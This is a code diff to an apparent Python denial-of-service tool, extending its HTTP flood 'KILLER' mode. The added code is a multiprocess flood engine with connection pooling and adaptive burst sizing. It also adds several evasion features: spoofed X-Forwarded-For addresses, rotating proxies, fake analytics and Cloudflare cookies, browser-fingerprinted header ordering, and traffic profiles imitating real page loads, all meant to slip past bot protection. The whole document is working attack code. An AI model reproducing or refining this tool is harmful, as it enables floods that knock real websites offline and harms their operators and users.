@@ -13,7 +13,8 @@ from pathlib import Path
 from re import compile
 from random import choice as randchoice, randint
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, SOL_SOCKET, SO_SNDBUF, SO_RCVBUF,
+                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, SOL_SOCKET, SO_SNDBUF, SO_RCVBUF, SO_KEEPALIVE,
+                    SO_REUSEADDR,
                     gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
@@ -240,7 +241,7 @@ search_engine_agents = [
 
 class Counter:
     def __init__(self, value=0):
-        self._value = RawValue('i', value)
+        self._value = RawValue('q', value)
 
     def __iadd__(self, value):
         self._value.value += value
@@ -297,7 +298,9 @@ class Tools:
     @staticmethod
     def send(sock: socket, packet: bytes):
         global BYTES_SEND, REQUESTS_SENT
-        if not sock.send(packet):
+        try:
+            sock.sendall(packet)
+        except Exception:
             return False
         BYTES_SEND += len(packet)
         REQUESTS_SENT += 1
@@ -911,8 +914,8 @@ class HttpFlood(Thread):
             ]
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
-        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+        self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type,
+                                                       target.raw_path_qs)
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -922,7 +925,6 @@ class HttpFlood(Thread):
                          'Sec-Fetch-Mode: navigate\r\n'
                          'Sec-Fetch-Site: none\r\n'
                          'Sec-Fetch-User: ?1\r\n'
-                         'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
 
@@ -940,13 +942,17 @@ class HttpFlood(Thread):
 
     @property
     def SpoofIP(self) -> str:
-        spoof: str = ProxyTools.Random.rand_ipv4()
-        return ("X-Forwarded-Proto: Http\r\n"
-                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
-                f"Via: {spoof}\r\n"
-                f"Client-IP: {spoof}\r\n"
-                f'X-Forwarded-For: {spoof}\r\n'
-                f'Real-IP: {spoof}\r\n')
+        ip1: str = ProxyTools.Random.rand_ipv4()
+        ip2: str = ProxyTools.Random.rand_ipv4()
+        parts = []
+        parts.append(f'X-Forwarded-For: {ip1}')
+        if randchoice([True, False, False, False]):
+            parts.append(f'Client-IP: {ip2}')
+        if randchoice([True, False, False, False, False]):
+            parts.append(f'Via: 1.1 {randchoice(["squid", "nginx", "cloudflare"])}')
+        if randchoice([True, False, False, False, False, False]):
+            parts.append(f'X-Real-IP: {ip2}')
+        return "\r\n".join(parts) + "\r\n" if parts else ""
 
     def generate_payload(self, other: str = None) -> bytes:
         return str.encode((self._payload +
@@ -963,8 +969,16 @@ class HttpFlood(Thread):
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         try:
-            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 256 * 1024)
-            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 256 * 1024)
+            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 1024 * 1024)
+            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 16 * 1024)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
         except Exception:
             pass
         sock.settimeout(.9)
@@ -981,7 +995,7 @@ class HttpFlood(Thread):
     @property
     def randHeadercontent(self) -> str:
         return (f"User-Agent: {randchoice(self._useragents)}\r\n"
-                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
+                f"Referer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                 self.SpoofIP)
 
     @staticmethod
@@ -1322,15 +1336,35 @@ class HttpFlood(Thread):
 
     def KILLER(self) -> None:
         global REQUESTS_SENT, BYTES_SEND
-        num_processes = max(1, min(cpu_count(), max(self._rpc, 1)))
+        num_processes = max(1, min(cpu_count(), 8))
         rpc_per_process = max(self._rpc // num_processes, 1)
-        workers_per_process = min(rpc_per_process * 10, 500)
+        workers_per_process = min(rpc_per_process * 8, 200)
+
+        ua_data = list(self._useragents)
+        ref_data = list(self._referers)
+        proxy_data = []
+        if self._proxies:
+            for p in self._proxies:
+                try:
+                    proxy_data.append((p.type.value, p.host, p.port, p.username or "", p.password or ""))
+                except Exception:
+                    pass
+        fp_data = list(self._KILLER_FINGERPRINTS)
+        target_host = self._target.host
+        target_port = self._target.port or (443 if self._target.scheme == "https" else 80)
+        target_scheme = self._target.scheme
+        target_authority = self._target.authority
+        raw_target = self._raw_target
+        is_https = self._target.scheme.lower() == "https"
 
         procs = []
         for _ in range(num_processes):
             p = Process(
-                target=self._killer_process_main,
-                args=(workers_per_process, rpc_per_process),
+                target=_killer_process_entry,
+                args=(workers_per_process, rpc_per_process,
+                      target_host, target_port, target_scheme,
+                      target_authority, raw_target, is_https,
+                      proxy_data, ua_data, ref_data, fp_data),
                 daemon=True,
             )
             p.start()
@@ -1342,27 +1376,38 @@ class HttpFlood(Thread):
         from random import uniform, randint, choice as rc
 
         conn_pool = []
-        conn_lock = Lock()
         pool_lock = Lock()
         active = True
+        refill_backoff = 0.001
 
         def refill_pool():
+            nonlocal refill_backoff
             while active:
                 with pool_lock:
                     if len(conn_pool) >= max_workers:
+                        refill_backoff = 0.001
                         break
                 try:
                     s = self.open_connection()
                     with pool_lock:
                         conn_pool.append(s)
+                    refill_backoff = 0.001
                 except Exception:
-                    sleep(0.01)
-                    break
+                    sleep(min(refill_backoff, 0.5))
+                    refill_backoff = min(refill_backoff * 2, 0.5)
+                    continue
 
         def get_connection():
             with pool_lock:
                 if conn_pool:
-                    return conn_pool.pop()
+                    s = conn_pool.pop()
+                    try:
+                        s.setblocking(False)
+                        s.recv(0, 0x400 | 0x40)  # MSG_PEEK | MSG_DONTWAIT
+                        s.setblocking(True)
+                        return s
+                    except (BlockingIOError, OSError):
+                        Tools.safe_close(s)
             try:
                 return self.open_connection()
             except Exception:
@@ -2003,7 +2048,7 @@ class HttpFlood(Thread):
         payload: Any = str.encode(self._payload +
                                   f"Host: {self._target.authority}\r\n" +
                                   "User-Agent: null\r\n" +
-                                  "Referrer: null\r\n" +
+                                   "Referer: null\r\n" +
                                   self.SpoofIP + "\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -2051,6 +2096,467 @@ class HttpFlood(Thread):
                     sleep(self._rpc / 15)
                     break
         Tools.safe_close(s)
+
+
+# ── KILLER Super Power: Standalone Process Entry ──────────────────────
+# Avoids Windows pickling issues by not referencing HttpFlood.self
+
+class _KillerSession:
+    __slots__ = ('cookies', 'visit_count', 'created_at')
+    def __init__(self):
+        self.cookies = {}
+        self.visit_count = 0
+        self.created_at = time()
+
+    def get_cookie_header(self):
+        self.visit_count += 1
+        parts = []
+        if self.visit_count >= 2 and "_ga" not in self.cookies:
+            self.cookies["_ga"] = "GA1.2.%d.%d" % (randint(10000000, 99999999),
+                                                     randint(1000000000, 1999999999))
+        if self.visit_count >= 2 and "_gid" not in self.cookies:
+            self.cookies["_gid"] = "GA1.2.%d.%d" % (randint(10000000, 99999999),
+                                                      randint(1000000000, 1999999999))
+        if self.visit_count >= 3 and "session" not in self.cookies:
+            from PyRoxy import Tools as PT
+            self.cookies["session"] = PT.Random.rand_str(32)
+        if self.visit_count >= 4 and "__cfduid" not in self.cookies:
+            from PyRoxy import Tools as PT
+            self.cookies["__cfduid"] = PT.Random.rand_str(43)
+        if self.visit_count >= 5 and "_fbp" not in self.cookies:
+            self.cookies["_fbp"] = "fb.1.%d.%d" % (randint(1000000000, 1999999999),
+                                                     randint(100000000, 999999999))
+        if self.visit_count >= 6 and "_gcl_au" not in self.cookies:
+            from PyRoxy import Tools as PT
+            self.cookies["_gcl_au"] = PT.Random.rand_str(22)
+        if self.visit_count >= 8 and "csrftoken" not in self.cookies:
+            from PyRoxy import Tools as PT
+            self.cookies["csrftoken"] = PT.Random.rand_str(40)
+        return "; ".join("%s=%s" % (k, v) for k, v in self.cookies.items()) if self.cookies else ""
+
+
+class _AdaptiveBurstController:
+    def __init__(self, initial_workers):
+        self.current_workers = initial_workers
+        self.max_workers = initial_workers
+        self.success_count = 0
+        self.fail_count = 0
+        self.window_size = 500
+
+    def record_success(self):
+        self.success_count += 1
+        self._maybe_adjust()
+
+    def record_failure(self):
+        self.fail_count += 1
+        self._maybe_adjust()
+
+    def _maybe_adjust(self):
+        total = self.success_count + self.fail_count
+        if total < self.window_size:
+            return
+        rate = self.success_count / total if total > 0 else 0
+        if rate > 0.95:
+            self.current_workers = min(self.current_workers + 5, self.max_workers)
+        elif rate < 0.80:
+            self.current_workers = max(self.current_workers - 10, 20)
+        self.success_count = 0
+        self.fail_count = 0
+
+    def get_burst_size(self):
+        return max(self.current_workers // 4, 10)
+
+
+def _killer_rand_path_fast(cached_paths):
+    from random import choice as rc, randint
+    tmpl = rc(cached_paths)
+    args = []
+    for _ in tmpl.count("%s"):
+        from PyRoxy import Tools as PT
+        args.append(PT.Random.rand_str(randchoice([4, 6, 8, 12])))
+    for _ in tmpl.count("%d"):
+        args.append(randint(1, 999999))
+    return tmpl % tuple(args) if args else tmpl
+
+
+def _killer_build_referrer(target_authority):
+    from random import choice as rc, randint
+    from PyRoxy import Tools as PT
+    chains = [
+        "https://www.google.com/search?q=%s" % PT.Random.rand_str(randint(3, 12)),
+        "https://www.bing.com/search?q=%s" % PT.Random.rand_str(randint(3, 12)),
+        "https://%s/" % target_authority,
+        "https://duckduckgo.com/?q=%s" % PT.Random.rand_str(randint(3, 12)),
+    ]
+    return rc(chains)
+
+
+_KILLER_PATHS_STANDALONE = (
+    "/?page=%d", "/search?q=%s", "/api/v1/%s", "/static/%s",
+    "/images/%s", "/assets/%s", "/data/%s", "/feed/%s",
+    "/index.html?%s=%s", "/%s", "/%s/%s",
+    "/css/%s", "/js/%s", "/fonts/%s", "/media/%s",
+    "/downloads/%s", "/uploads/%s", "/content/%s",
+    "/v2/%s", "/v3/%s", "/rest/%s", "/graphql",
+    "/wp-admin/%s", "/wp-content/%s", "/wp-includes/%s",
+    "/blog/%s", "/news/%s", "/articles/%s", "/posts/%s",
+)
+
+
+def _killer_build_request_standalone(method, path, fp, target_authority,
+                                     referers, cached_target_path):
+    from random import randint, choice as rc
+    from PyRoxy import Tools as PT
+
+    headers = {}
+    headers["host"] = target_authority
+    headers["user-agent"] = fp["ua_prefix"]
+
+    if fp.get("sec_ch_ua"):
+        headers["sec-ch-ua"] = fp["sec_ch_ua"]
+        headers["sec-ch-ua-mobile"] = "?0"
+        headers["sec-ch-ua-platform"] = fp["platform"]
+
+    headers["accept"] = fp["accept"]
+    headers["accept-language"] = rc(fp["languages"])
+    headers["accept-encoding"] = rc((
+        "gzip, deflate, br, zstd",
+        "gzip, deflate, br",
+        "gzip, deflate",
+    ))
+    headers["x-forwarded-for"] = PT.Random.rand_ipv4()
+
+    if method == "POST":
+        rand_data = PT.Random.rand_str(randint(16, 128))
+        headers["content-type"] = rc((
+            "application/x-www-form-urlencoded",
+            "application/json"))
+        headers["content-length"] = str(len(rand_data) + 5)
+
+    if rc([True, False]):
+        headers["connection"] = "keep-alive"
+    if rc([True, False]):
+        headers["dnt"] = "1"
+    if rc([True, True, False]):
+        headers["cache-control"] = rc((
+            "no-cache", "no-store, must-revalidate", "max-age=0"))
+
+    if rc([True, True, False]):
+        headers["sec-fetch-dest"] = rc((
+            "document", "empty", "script",
+            "style", "image", "font"))
+        headers["sec-fetch-mode"] = rc((
+            "navigate", "cors", "same-origin"))
+        headers["sec-fetch-site"] = rc((
+            "none", "same-origin", "cross-site", "same-site"))
+        headers["sec-fetch-user"] = "?1"
+
+    if rc([True, False]):
+        headers["upgrade-insecure-requests"] = "1"
+
+    if fp.get("sec_ch_ua") is None and rc([True, False, False, False, False]):
+        headers["sec-gpc"] = "1"
+
+    if rc([True, False]):
+        headers["pragma"] = "no-cache"
+
+    if rc([True, False, False, False]):
+        ref = rc(referers)
+        headers["referer"] = "%s%s" % (ref, cached_target_path)
+
+    if fp.get("device_memory") and rc([True, False, False, False, False]):
+        headers["device-memory"] = rc(fp["device_memory"])
+    if fp.get("viewport") and rc([True, False, False, False, False, False]):
+        vp = fp["viewport"].split("x")
+        headers["viewport-width"] = vp[0]
+    if fp.get("ect") and rc([True, False, False, False, False, False, False]):
+        headers["ect"] = rc(fp["ect"])
+        headers["rtt"] = rc(fp["rtt"])
+        headers["downlink"] = rc(fp["downlink"])
+
+    if rc([True, False, False, False, False, False, False, False, False]):
+        headers["priority"] = rc(("u=0, i", "u=1, i", "u=0"))
+
+    order = fp["order"]
+    ordered = []
+    for key in order:
+        if key in headers:
+            ordered.append((key, headers.pop(key)))
+    for key, val in headers.items():
+        ordered.append((key, val))
+
+    parts = ["%s %s HTTP/1.1\r\n" % (method, path)]
+    for name, val in ordered:
+        variant = randint(0, 2)
+        if variant == 0:
+            name = name.lower()
+        elif variant == 1:
+            name = name.title()
+        parts.append("%s: %s\r\n" % (name, val))
+    parts.append("\r\n")
+
+    if method == "POST":
+        parts.append("data=%s" % PT.Random.rand_str(randint(16, 128)))
+
+    return str.encode("".join(parts))
+
+
+def _killer_process_entry(max_workers, rpc,
+                          target_host, target_port, target_scheme,
+                          target_authority, raw_target, is_https,
+                          proxy_data, useragents, referers, fingerprints):
+    from random import uniform, randint, choice as rc, expovariate
+    from socket import AF_INET, SOCK_STREAM, socket, SOL_SOCKET, SO_REUSEADDR, SO_SNDBUF, SO_RCVBUF
+    from socket import TCP_NODELAY, IPPROTO_TCP
+    from concurrent.futures import ThreadPoolExecutor
+    from ssl import SSLContext, create_default_context, CERT_NONE
+    import ssl as _ssl
+    from PyRoxy import Proxy, ProxyType, Tools as PT
+    from PyRoxy import Tools as ProxyTools
+
+    try:
+        from files.tls_client import create_session as _create_tls_session, HAS_CURL_CFFI
+    except ImportError:
+        HAS_CURL_CFFI = False
+
+    ctx = create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = CERT_NONE
+    if hasattr(ctx, "minimum_version") and hasattr(_ssl, "TLSVersion"):
+        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2
+
+    proxy_objects = []
+    for pdata in proxy_data:
+        try:
+            ptype = ProxyType(pdata[0])
+            proxy_objects.append(Proxy(ptype, pdata[1], pdata[2], pdata[3] or None, pdata[4] or None))
+        except Exception:
+            pass
+
+    def _open_conn():
+        if proxy_objects:
+            sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
+        else:
+            sock = socket(AF_INET, SOCK_STREAM)
+        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 1024 * 1024)
+            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 16 * 1024)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
+        except Exception:
+            pass
+        sock.settimeout(3.0)
+        raw = raw_target
+        sock.connect(raw)
+        if is_https:
+            sock = ctx.wrap_socket(sock, server_hostname=target_host,
+                                   server_side=False, do_handshake_on_connect=True,
+                                   suppress_ragged_eofs=True)
+        return sock
+
+    conn_pool = []
+    pool_lock = Lock()
+    active = True
+    refill_backoff = 0.001
+    cached_target_path = parse.quote("/%s" % target_authority) if target_authority else "/"
+    fp_list = list(fingerprints)
+    ua_list = list(useragents)
+    ref_list = list(referers)
+
+    def refill_pool():
+        nonlocal refill_backoff
+        while active:
+            with pool_lock:
+                if len(conn_pool) >= max_workers:
+                    refill_backoff = 0.001
+                    break
+            try:
+                s = _open_conn()
+                with pool_lock:
+                    conn_pool.append(s)
+                refill_backoff = 0.001
+            except Exception:
+                sleep(min(refill_backoff, 0.5))
+                refill_backoff = min(refill_backoff * 2, 0.5)
+                continue
+
+    def get_connection():
+        with pool_lock:
+            while conn_pool:
+                s = conn_pool.pop()
+                try:
+                    s.setblocking(False)
+                    s.recv(0, 0x400 | 0x40)
+                    s.setblocking(True)
+                    return s
+                except (BlockingIOError, OSError):
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+        try:
+            return _open_conn()
+        except Exception:
+            return None
+
+    def return_connection(s):
+        if s is None:
+            return
+        with pool_lock:
+            if len(conn_pool) < max_workers:
+                conn_pool.append(s)
+                return
+        try:
+            s.close()
+        except Exception:
+            pass
+
+    def _worker(get_conn, return_conn, rpc_count, burst_ctrl, session_cache):
+        fp = rc(fp_list)
+        s = get_conn()
+        if s is None:
+            return
+
+        try:
+            sid = id(s)
+            if sid not in session_cache:
+                session_cache[sid] = _KillerSession()
+            ks = session_cache[sid]
+
+            profile_name, profile_steps = rc((
+                ("PAGE_LOAD", (
+                    ("GET", "/"),
+                    ("GET", "/style.css"),
+                    ("GET", "/app.js"),
+                    ("GET", "/favicon.ico"),
+                )),
+                ("API_CALL", (
+                    ("GET", "/api/v1/data"),
+                    ("POST", "/api/v1/track"),
+                    ("GET", "/api/v1/user"),
+                )),
+                ("SEARCH", (
+                    ("GET", "/search?q={rand}"),
+                    ("GET", "/results"),
+                    ("GET", "/suggest?q={rand}"),
+                )),
+                ("SPA_NAV", (
+                    ("GET", "/"),
+                    ("GET", "/assets/main.{rand}.js"),
+                    ("GET", "/api/v2/config"),
+                    ("GET", "/api/v2/user"),
+                )),
+                ("RAW_FLOOD", None),
+            ))
+
+            if profile_steps and profile_name != "RAW_FLOOD":
+                for i, (method, path) in enumerate(profile_steps):
+                    path = path.replace("{rand}", PT.Random.rand_str(8))
+                    payload = _killer_build_request_standalone(
+                        method, path, fp, target_authority,
+                        ref_list, cached_target_path)
+                    if not Tools.send(s, payload):
+                        burst_ctrl.record_failure()
+                        break
+                    burst_ctrl.record_success()
+                    if i == 0:
+                        sleep(expovariate(1.0 / 0.12))
+                    elif i == 1:
+                        sleep(expovariate(1.0 / 0.03))
+                    else:
+                        sleep(expovariate(1.0 / 0.015))
+            else:
+                batch = min(rpc, randint(5, 15))
+                for _ in range(batch):
+                    method = rc(("GET", "GET", "GET", "POST", "HEAD"))
+                    rand_path = _killer_rand_path_fast(_KILLER_PATHS_STANDALONE)
+                    cookie = ks.get_cookie_header()
+                    spoof = PT.Random.rand_ipv4()
+
+                    parts = [
+                        "%s %s HTTP/1.1\r\n" % (method, rand_path),
+                        "Host: %s\r\n" % target_authority,
+                        "User-Agent: %s\r\n" % fp["ua_prefix"],
+                        "Accept: %s\r\n" % rc(fp["accept"]),
+                        "Accept-Language: %s\r\n" % rc(fp["languages"]),
+                        "Accept-Encoding: %s\r\n" % rc((
+                            "gzip, deflate, br, zstd",
+                            "gzip, deflate, br",
+                            "gzip, deflate")),
+                        "X-Forwarded-For: %s\r\n" % spoof,
+                    ]
+                    if fp.get("sec_ch_ua"):
+                        parts.append('Sec-CH-UA: %s\r\n' % fp["sec_ch_ua"])
+                        parts.append('Sec-CH-UA-Mobile: ?0\r\n')
+                        parts.append('Sec-CH-UA-Platform: %s\r\n' % fp["platform"])
+                    if cookie:
+                        parts.append("Cookie: %s\r\n" % cookie)
+                    if rc([True, False]):
+                        parts.append("DNT: 1\r\n")
+                    if rc([True, False]):
+                        parts.append("Cache-Control: %s\r\n" % rc(("no-cache", "no-store")))
+                    if rc([True, False]):
+                        parts.append("Connection: keep-alive\r\n")
+                    if rc([True, True, False]):
+                        parts.append("Sec-Fetch-Dest: %s\r\n" % rc(("document", "empty", "script")))
+                        parts.append("Sec-Fetch-Mode: %s\r\n" % rc(("navigate", "cors")))
+                        parts.append("Sec-Fetch-Site: %s\r\n" % rc(("none", "same-origin")))
+                        parts.append("Sec-Fetch-User: ?1\r\n")
+                    if rc([True, False]):
+                        parts.append("Upgrade-Insecure-Requests: 1\r\n")
+                    if rc([True, False, False, False]):
+                        parts.append("Referer: %s\r\n" % _killer_build_referrer(target_authority))
+                    if fp.get("device_memory") and rc([True, False, False, False, False]):
+                        parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
+                    if rc([True, False, False, False, False, False, False, False, False]):
+                        parts.append("Priority: %s\r\n" % rc(("u=0, i", "u=1, i")))
+                    parts.append("\r\n")
+                    if method == "POST":
+                        rand_data = PT.Random.rand_str(randint(32, 128))
+                        parts.insert(-1, "Content-Type: application/json\r\n")
+                        parts.insert(-1, "Content-Length: %d\r\n" % (len(rand_data) + 16))
+                        parts.append('{"data":"%s"}' % rand_data)
+
+                    payload = str.encode("".join(parts))
+                    if not Tools.send(s, payload):
+                        burst_ctrl.record_failure()
+                        break
+                    burst_ctrl.record_success()
+                    sleep(expovariate(1.0 / 0.003))
+
+            return_conn(s)
+        except Exception:
+            try:
+                s.close()
+            except Exception:
+                pass
+
+    refill_pool()
+    burst_ctrl = _AdaptiveBurstController(max_workers)
+    session_cache = {}
+    base_delay = max(0.0005, 1.0 / max(max_workers, 1))
+
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
+        while active:
+            refill_pool()
+            burst = burst_ctrl.get_burst_size()
+            for _ in range(burst):
+                pool.submit(_worker, get_connection, return_connection,
+                            rpc, burst_ctrl, session_cache)
+            sleep(base_delay * uniform(0.3, 1.0))
+            for _ in range(max(burst // 3, 5)):
+                pool.submit(_worker, get_connection, return_connection,
+                            rpc, burst_ctrl, session_cache)
+            sleep(base_delay * uniform(1.5, 4.0))
+            if len(session_cache) > max_workers * 2:
+                session_cache.clear()
 
 
 class ProxyManager:
